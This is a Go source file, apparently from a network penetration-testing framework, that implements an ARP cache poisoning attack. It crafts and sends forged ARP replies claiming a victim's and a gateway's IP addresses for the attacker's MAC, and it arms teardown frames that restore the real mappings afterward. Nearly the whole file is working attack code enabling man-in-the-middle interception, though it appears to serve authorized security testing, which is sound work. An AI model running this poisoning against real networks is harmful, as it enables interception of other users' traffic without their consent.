package fh

import (
	"context"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type arpSpoofFinding struct {
	Action  string   `json:"action"`
	Targets []string `json:"targets"`
	Gateway string   `json:"gateway"`
	Restore string   `json:"restore"`
}

// RunARPSpoof sends ARP replies for the target's victim and gateway pair
// after arming neighbor repairs on the runner's teardown handle. The
// preceding ip-forward-restore step is a no-op because this behavior does
// not change host forwarding. The verdict is pending: whether the victim's
// cache took the poison needs a probe through the attacker it does not
// have. Craft and send failures include operation context.
func RunARPSpoof(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC, check.FieldGateway, check.FieldGatewayMAC); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	victimMAC, victimIP := deps.Target.Victim.MAC, deps.Target.Victim.IP
	gwMAC, gwIP := deps.Target.Gateway.MAC, deps.Target.Gateway.IP

	// Arm the teardown steps before the first frame so an interrupted
	// run still restores. The order of Arm calls is the execution order
	// (reverse-dependency: least-dependent first). ip_forward restore is
	// host-local state, independent of the wire, and neighbor-cache repairs
	// depend on the attacker's own stack being in a known state, so
	// ip_forward goes first.
	deps.Teardown.Arm("ip-forward-restore", func(_ context.Context) error {
		return nil
	})

	// Pre-build the neighbor repair frames so the teardown step has them.
	victimRepair, err := craftARPRestore(src, victimMAC, victimIP, gwIP, gwMAC)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft victim repair")
	}
	gwRepair, err := craftARPRestore(src, gwMAC, gwIP, victimIP, victimMAC)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft gateway repair")
	}
	deps.Teardown.Arm("neighbor-unicast-repair-victim", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, victimRepair)
	})
	deps.Teardown.Arm("neighbor-unicast-repair-gateway", func(ctx context.Context) error {
		return deps.AttackLeg.Send(ctx, gwRepair)
	})

	// Send poison frames: victim→gw (attacker claims to be gw),
	// gw→victim (attacker claims to be victim).
	victimPoison, err := craftARPSpoof(src, victimMAC, victimIP, gwIP)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft victim poison")
	}
	gwPoison, err := craftARPSpoof(src, gwMAC, gwIP, victimIP)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: craft gateway poison")
	}

	if err := deps.AttackLeg.Send(ctx, victimPoison); err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: send victim poison")
	}
	if err := deps.AttackLeg.Send(ctx, gwPoison); err != nil {
		return check.Verdict{}, errs.Wrap(err, "arpspoof: send gateway poison")
	}

	detail, _ := json.Marshal(arpSpoofFinding{
		Action:  "arp-poison",
		Targets: []string{victimIP.String()},
		Gateway: gwIP.String(),
		Restore: "ip-forward-restore + neighbor-unicast-repairs",
	})
	deps.Emitter.Finding("arp", detail)

	return check.Pending("no observable: poison acceptance needs a probe through the attacker, and the ip-forward-restore step is a no-op"), nil
}

// craftARPSpoof builds a unicast ARP reply: "spoofedIP is-at attackerMAC".
func craftARPSpoof(src, dstMAC net.HardwareAddr, dstIP, spoofedIP net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   src,
		SourceProtAddress: spoofedIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craft.Default(eth, arp)
}

// craftARPRestore builds a unicast ARP reply restoring the real MAC mapping.
func craftARPRestore(src, dstMAC net.HardwareAddr, dstIP, srcIP net.IP, realMAC net.HardwareAddr) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := &layers.ARP{
		AddrType:          1,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         2, // reply
		SourceHwAddress:   realMAC,
		SourceProtAddress: srcIP,
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP,
	}
	return craft.Default(eth, arp)
}
